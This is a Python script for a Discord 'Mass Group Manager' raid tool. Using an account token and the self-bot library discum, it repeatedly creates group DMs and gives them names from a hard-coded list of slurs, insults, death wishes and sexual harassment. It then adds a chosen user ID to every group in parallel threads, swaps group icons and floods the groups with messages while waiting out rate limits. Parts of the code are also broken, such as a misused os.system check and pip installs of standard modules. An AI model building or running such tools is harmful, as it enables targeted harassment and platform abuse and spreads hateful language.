import subprocess
import os
def install_modules():
    if os.name != "nt": subprocess.call("apt install python3-pip -y") # if linux is debian based (not arch based)

    subprocess.call("python -m pip install colorama" if os.system == "nt" else
                    "pip3 install colorama",
                    shell=False)

    subprocess.call("python -m pip install requests" if os.system == "nt" else
                    "pip3 install requests",
                    shell=False)

    subprocess.call("python -m pip install --upgrade git+https://github.com/Merubokkusu/Discord-S.C.U.M.git#egg=discum" if os.system == "nt" else
                    "pip3 install --upgrade git+https://github.com/Merubokkusu/Discord-S.C.U.M.git#egg=discum",
                    shell=False)

    subprocess.call("python -m pip install ctypes" if os.system == "nt" else
                    "pip3 install ctypes",
                    shell=False)

    subprocess.call("python -m pip install sys" if os.system == "nt" else
                    "pip3 install sys",
                    shell=False)
    subprocess.call("python -m pip install os" if os.system == "nt" else
                    "pip3 install os",
                    shell=False)
    os.system("cls" if os.name == "nt" else "clear")
install_modules()

import sys
import colorama
import ctypes
import requests
import discum
import json
import time
import random
import threading

developer = "testuser#0001"
def logo():
    if os.name == "nt": ctypes.windll.kernel32.SetConsoleTitleW(f'[Mass Group Manager] | Ready for use <3') # windows system
    return (print(f"""{colorama.Fore.RESET}{colorama.Fore.LIGHTMAGENTA_EX}
    _______          _________ _        ______    _________ _______ _________ _        _______  _______
    (  ____ \|\     /|\__   __/( \      (  __  \   \__    _/(  ___  )\__   __/( (    /|(  ____ \(  ____ )
    | (    \/| )   ( |   ) (   | (      | (  \  )     )  (  | (   ) |   ) (   |  \  ( || (    \/| (    )|
    | |      | |   | |   | |   | |      | |   ) |     |  |  | |   | |   | |   |   \ | || (__    | (____)|
    | | ____ | |   | |   | |   | |      | |   | |     |  |  | |   | |   | |   | (\ \) ||  __)   |     __)
    | | \_  )| |   | |   | |   | |      | |   ) |     |  |  | |   | |   | |   | | \   || (      | (\ (
    | (___) || (___) |___) (___| (____/\| (__/  )  |\_)  )  | (___) |___) (___| )  \  || (____/\| ) \ \__
    (_______)(_______)\_______/(_______/(______/   (____/   (_______)\_______/|/    )_)(_______/|/   \__/

    ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    created by {developer}
    {colorama.Fore.RESET}
    """))

def main_menu():
    print(f"""{colorama.Fore.LIGHTCYAN_EX}
    [1] Mass Group Creator
    [2] Mass Member to Group Adder
    [3] Mass Group Icon Changer
    [4] Mass Group Message Sender
    {colorama.Fore.RESET}
    """)

logo()
main_menu()
option = input(f"{colorama.Fore.LIGHTMAGENTA_EX}    [Final] Select a Option from above: ")
if option != "1" and option != "2" and option != "3" and option != "4": print(f"{colorama.Fore.RED}    [!] Invalid Option selected!{colorama.Fore.RESET}"), sys.exit(1337)

# Mass Group Creator
if option == "1":
    with open("config.json") as conf:
        config = json.load(conf)
        token = config["token"]
        image_path = config["icon path"]
        names = [
            "Fuck you",
            "Stupid",
            "Ass",
            "Asshole",
            "Retard",
            "Fuck",
            "Raid",
            "Spam",
            "dont leave",
            "you cant leave",
            "get fucked",
            "bitch",
            "gore",
            "go outside",
            "mf",
            "motherfucker",
            "funny",
            "rage",
            "delete ur account",
            "i fucking hate u guys",
            "discord is a meme",
            "can not escape",
            "cant escape",
            "random shitty shit",
            "u are fucking gay",
            "imagine being dumb",
            "german fuckers",
            "u got a bad life lmao",
            "stop watching porn kid",
            "stfu",
            "lmao",
            "hehe i just hate you",
            "go work",
            "imagine wasting ur time by leaving",
            "u got such a low iq", "fuck your dad",
            "fuck your mom",
            "i fuck you until u die",
            "pls die already",
            "u cant stop me",
            "bruh",
            "pls burn in hell",
            "find us on melion.cloud",
            "fucked by melion.cloud",
            "wash ur hand lol",
            "sleep outside now",
            "hoes mad",
            "niqqa",
            "nigga",
            "sexy anna",
            "nibba",
            "best name idc",
            "fuck off",
            "oh boi you messed up",
            "bruh why you stink",
            "just calm down xD",
            "ur pants are wet lmao",
            "oh boi pls fuck me",
            "ur fucking sexy so go fuck me",
            "i love you so come to me and i fuck ya"]

    headers = {
        "Authorization": token,
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "de-DE,de;q=0.9,en-US;q=0.8,en;q=0.7",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 OPR/81.0.4196.31"

    }

    while True:
        try:
            r = requests.post('https://discord.com/api/v9/users/@me/channels', headers=headers, json={"recipients": []})
            json_resp = json.loads(r.content)
            group_id = json_resp['id']
            bot = discum.Client(token=token, log={"console": False, "file": False})
            bot.setDmGroupIcon(group_id, image_path)
            time.sleep(0.5)
            response = requests.patch(f'https://discord.com/api/v9/channels/{group_id}', headers=headers, json={'name': random.choice(names)})
            print(f"Response: {response}")

            with open("group_id.txt", "a") as group_id:
                group_id.write(json_resp['id'] + '\n')
        except: print(json_resp['retry_after']), time.sleep(json_resp['retry_after'])

# Mass Member to Group Adder
elif option == "2":
    user_id = input('   Enter User ID: ')
    config = json.load(open('config.json'))
    token = config.get('token')

    headers = {
        "Authorization": token,
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "de-DE,de;q=0.9,en-US;q=0.8,en;q=0.7",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 OPR/81.0.4196.31"

    }
    def sendreq():
        shit = open('group_id.txt')
        for line in shit:
            l2 = random.choice(open('group_id.txt').readlines())
            already_checked = open('log.txt', mode='r')
            all_of_it = already_checked.read()
            check = all_of_it.find(l2)
            if check != -1:
                pass
            else:
                f = open('log.txt', 'a')
                f.write(l2)
                f.close()
                channelid = l2.strip('\n')
                response = requests.put(f'https://discord.com/api/v9/channels/{channelid}/recipients/{user_id}', headers=headers)


    # changing the value of the variable "th" might cause connection issues and the whole code will run wayyy slower even if you put a higher number.
    # this number do NOT mean the total requests. the number of connections at the same time is meant. the total connections are defined in for line in shit
    # so the total number of connections equals to the lines of the group_id.txt file.
    th = 10
    for i in range(th):
        t = threading.Thread(target=sendreq)
        t.start()

# Mass Group Icon Changer
elif option == "3":
    with open("config.json") as conf:
        config = json.load(conf)
        token = config["token"]
        image_path = config["icon path"]

    while True:
        try:
            shit = open('group_id.txt')
            for _ in shit:
                l2 = random.choice(open('group_id.txt').readlines())
                already_checked = open('log.txt', mode='r')
                all_of_it = already_checked.read()
                check = all_of_it.find(l2)
                if check != -1: pass
                else:
                    # while True:
                    for _ in range(message_count):
                        try:
                            with open("log.txt", "a+") as f: f.write(l2)
                            group_id = l2.strip('\n')
                            bot = discum.Client(token=token, log={"console": False, "file": False})
                            bot.setDmGroupIcon(group_id, image_path)
                            time.sleep(0.5)
                            print(f"    [+] Group Icon changed to: {image_path}")

                        except IndexError:
                            print(f"    {colorama.Fore.LIGHTRED_EX}No GroupID to change the icon to found in log.txt")
        except:
            print(json_resp['retry_after']), time.sleep(json_resp['retry_after'])

# Mass Group Message Sender
elif option == "4":
    # make sure to look at the other files and sometimes you se something around "with open("...txt") as file:"
    # this is defently better then just open(...) as it manage the files automatically and you will not need to close the files manually etc.

    open('log.txt', 'w').close()
    message = input('    Enter total Messages to be sent: ')  # note: that Messages will be sent to the same group multiplie times if you choose a higher value then the number of groups you are in.
    message_count = int(input('    Enter Message Count: '))
    config = json.load(open('config.json'))
    token = config.get('token')

    def sendreq():
        shit = open('group_id.txt')
        for _ in shit:
            l2 = random.choice(open('group_id.txt').readlines())
            already_checked = open('log.txt', mode='r')
            all_of_it = already_checked.read()
            check = all_of_it.find(l2)
            if check != -1:
                pass
            else:
                """
                ==========================================================================================================================================
                if you want to send messages in a loop, uncomment the 'while True' by removing the '#' and add a '#' at 'for line in range(message_count):'
                If you use 'while True' messages probably will be sent again in a group, they already where sent in!
                ==========================================================================================================================================
                """
                # while True:
                for _ in range(message_count):
                    try:
                        with open("log.txt", "a+") as f:
                            f.write(l2)
                        channelid = l2.strip('\n')

                        headers = {
                            "Authorization": token,
                            "accept-encoding": "gzip, deflate, br",
                            "accept-language": "de-DE,de;q=0.9,en-US;q=0.8,en;q=0.7",
                            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0",
                            "accept": "*/*",
                            "referer": f"https://discord.com/channels/@me/{channelid}",
                            "host": "discord.com",
                            "connection": "keep-alive",
                            "orgin": "https://discord.com"
                        }

                        data = {
                            "content": message,
                            "tts": False
                        }

                        response = requests.post(f'https://discord.com/api/v9/channels/{channelid}/messages', data=data, headers=headers)
                        json_resp = json.loads(response.content)
                        if response.status_code == 200 or response.status_code == 204 or response.status_code == 201: print(f'    {colorama.Fore.LIGHTGREEN_EX}[+] Message Sent To {channelid} {colorama.Fore.RESET}\n')
                        if response.status_code == 429:
                            print(f"    {colorama.Fore.LIGHTRED_EX}[-] Message Not Sent To {channelid} => Ratelimit for {json_resp['retry_after']} seconds!{colorama.Fore.RESET}")
                            time.sleep(json_resp['retry_after'])

                        # elif response.status_code: print(f'    {colorama.Fore.LIGHTYELLOW_EX}[+] Message could not be sent => HTTP Error Code: {response.status_code}{colorama.Fore.RESET}\n')


                    except:
                        print(f"    {colorama.Fore.LIGHTRED_EX}[-] Message Not Sent To {channelid} => Ratelimit for {json_resp['retry_after']} seconds!{colorama.Fore.RESET}")
                        time.sleep(json_resp['retry_after'])


    # changing the value of the range(10) might cause connection issues and the whole code will run wayyy slower even if you put a higher number.
    # this number do NOT mean the total requests. the number of connections at the same time is meant. the total requests are defined in for line in shit
    # so the total number of requests equals to the number of lines in the group_id.txt file.
    for i in range(10):
        t = threading.Thread(target=sendreq)
        t.start()
